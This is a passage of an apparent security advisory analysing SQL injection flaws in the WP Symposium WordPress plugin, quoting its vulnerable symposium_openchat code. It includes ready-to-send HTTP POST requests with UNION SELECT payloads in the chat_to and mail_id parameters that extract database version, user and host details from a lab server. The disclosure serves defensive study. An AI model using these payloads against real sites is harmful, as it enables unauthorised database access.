			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_mail_functions.php HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7Ccb77d4fd4fcd2448f70ceefc746f38fe;  wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7C486bd8321f9973799f837e666abb40f4;
Content-Type: application/x-www-form-urlencoded
Content-Length: 162

action=getReply&amp;recipient_id=1353533 UNION SELECT @@version&amp;mail_id=335353 UNION SELECT @@version, user(), system_user(), database(), @@hostname, @@datadir, 7, 8, 9, 10</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c78430032985-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c78430032985-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c78430032985-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c78430032985-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c78430032985-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c78430032985-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c78430032985-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c78430032985-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_mail_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c78430032985-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f28c78430032985-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7Ccb77d4fd4fcd2448f70ceefc746f38fe</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7C486bd8321f9973799f837e666abb40f4</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c78430032985-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f28c78430032985-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">162</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c78430032985-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c78430032985-7"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">getReply</span><span class="crayon-o">&amp;</span><span class="crayon-v">recipient_id</span><span class="crayon-o">=</span><span class="crayon-cn">1353533</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">version</span><span class="crayon-o">&amp;</span><span class="crayon-v">mail_id</span><span class="crayon-o">=</span><span class="crayon-cn">335353</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">version</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">user</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">system_user</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">database</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">hostname</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">datadir</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0046 seconds] -->
<p>Analysis of symposium_openchat vulnerability<br />
The symposium_openchat function in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_bar_functions.php?rev=552870">/ajax/symposium_bar_functions.php</a> allows for opening a chat with another user on the site. It does so by getting the chat_to POST parameter, which si expected to be an integer, and then checks if that chat already exists:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c7f822074940" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Open chat
if ($_POST['action'] == 'symposium_openchat') {

    global $wpdb, $current_user;

    if (is_user_logged_in()) {

        $chat_to = $_POST['chat_to'];
        $chat_from = $current_user-&gt;ID;
        $r = ';

        // check to see if they are already chatting
        if ($wpdb-&gt;query( $wpdb-&gt;prepare("SELECT chid FROM ".$wpdb-&gt;base_prefix."symposium_chat WHERE (chat_from = ".$chat_from." AND chat_to = ".$chat_to.") OR (chat_from = ".$chat_to." AND chat_to = ".$chat_from.")"))) {

            // clear the closed flag
            $sql = "DELETE FROM ".$wpdb-&gt;base_prefix."symposium_chat WHERE chat_message = '[closed-%d]' AND ( (chat_from = %d AND chat_to = %d) OR (chat_from = %d AND chat_to = %d) )";
            $wpdb-&gt;query( $wpdb-&gt;prepare($sql, $chat_from, $chat_from, $chat_to, $chat_to, $chat_from) );
            $r .= $chat_to;

        } else {

            if ( $rows_affected = $wpdb-&gt;insert( $wpdb-&gt;base_prefix . "symposium_chat", array( 
                'chat_to' =&gt; $chat_to, 
                'chat_from' =&gt; $chat_from, 
                'chat_message' =&gt; '[start]',
                'chat_timestamp' =&gt; date("Y-m-d H:i:s") 
            ) ) ) {

                $display_name = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT display_name FROM ".$wpdb-&gt;base_prefix."users WHERE ID = ".$chat_to));
                $r .= "OK[split]".$chat_to."[split]".$display_name;

            }
        }

        echo $r;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-8">8</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-10">10</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-12">12</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-14">14</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-16">16</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-18">18</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-20">20</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-22">22</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-24">24</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-26">26</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-28">28</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-30">30</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-32">32</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c7f822074940-34">34</div><div class="crayon-num" data-line="crayon-53c9878f28c7f822074940-35">35</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c7f822074940-1"><span class="crayon-c">// Open chat</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'symposium_openchat'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">chat_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'chat_to'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">chat_from</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">';</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-11">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-12"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// check to see if they are already chatting</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($wpdb-&gt;query( $wpdb-&gt;prepare("SELECT chid FROM ".$wpdb-&gt;base_prefix."symposium_chat WHERE (chat_from = ".$chat_from." AND chat_to = ".$chat_to.") OR (chat_from = ".$chat_to." AND chat_to = ".$chat_from.")"))) {</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-14">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// clear the closed flag</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql = "DELETE FROM ".$wpdb-&gt;base_prefix."symposium_chat WHERE chat_message = '</span><span class="crayon-sy">[</span><span class="crayon-i">closed</span><span class="crayon-o">-</span><span class="crayon-o">%</span><span class="crayon-i">d</span><span class="crayon-sy">]</span><span class="crayon-s">' AND ( (chat_from = %d AND chat_to = %d) OR (chat_from = %d AND chat_to = %d) )";</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$wpdb-&gt;query( $wpdb-&gt;prepare($sql, $chat_from, $chat_from, $chat_to, $chat_to, $chat_from) );</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$r .= $chat_to;</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-19">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $rows_affected = $wpdb-&gt;insert( $wpdb-&gt;base_prefix . "symposium_chat", array( </span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'</span><span class="crayon-i">chat_to</span><span class="crayon-s">' =&gt; $chat_to, </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'</span><span class="crayon-i">chat_from</span><span class="crayon-s">' =&gt; $chat_from, </span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'</span><span class="crayon-i">chat_message</span><span class="crayon-s">' =&gt; '</span><span class="crayon-sy">[</span><span class="crayon-i">start</span><span class="crayon-sy">]</span><span class="crayon-s">',</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'</span><span class="crayon-i">chat_timestamp</span>'<span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-28">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">display_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">chat_to</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"OK[split]"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">chat_to</span><span class="crayon-sy">.</span><span class="crayon-s">"[split]"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">display_name</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-31">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c7f822074940-34">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c7f822074940-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0059 seconds] -->
<p>If you&#8217;re logged in and the chat does not exist, on line 572 it will then insert a new chat and select the display name from the user table, and incorrectly use the wpdb_prepare function. By rather concatenating the ID in instead of passing it as a parameter, we can now select data out of the database like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c87166189088" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_bar_functions.php HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7Ccb77d4fd4fcd2448f70ceefc746f38fe;  wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7C486bd8321f9973799f837e666abb40f4;
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

action=symposium_openchat&amp;chat_to=3535 UNION SELECT @@version</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c87166189088-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c87166189088-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c87166189088-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c87166189088-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c87166189088-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c87166189088-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c87166189088-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c87166189088-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_bar_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c87166189088-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f28c87166189088-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7Ccb77d4fd4fcd2448f70ceefc746f38fe</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7C486bd8321f9973799f837e666abb40f4</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c87166189088-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f28c87166189088-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span 